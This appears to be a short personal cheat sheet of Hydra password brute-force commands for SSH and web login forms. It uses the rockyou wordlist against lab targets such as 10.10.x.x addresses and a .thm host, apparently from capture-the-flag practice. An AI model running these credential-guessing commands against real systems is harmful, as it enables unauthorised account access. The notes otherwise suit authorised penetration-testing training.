Hydra Typical usage.

Crack SSH when the username is known.
> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.138.193 ssh

If you don't know the username you can pass a list as well.
> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.138.193 ssh

For a web site you have to use ^^ and find the HTML designator.  
> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

> sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"

Another example.

> hydra -l admin -P /usr/share/wordlists/rockyou.txt target.thm http-post-form "/login.aspx:UserName=^USER^, Password=^PASS^:F=Login Failed"

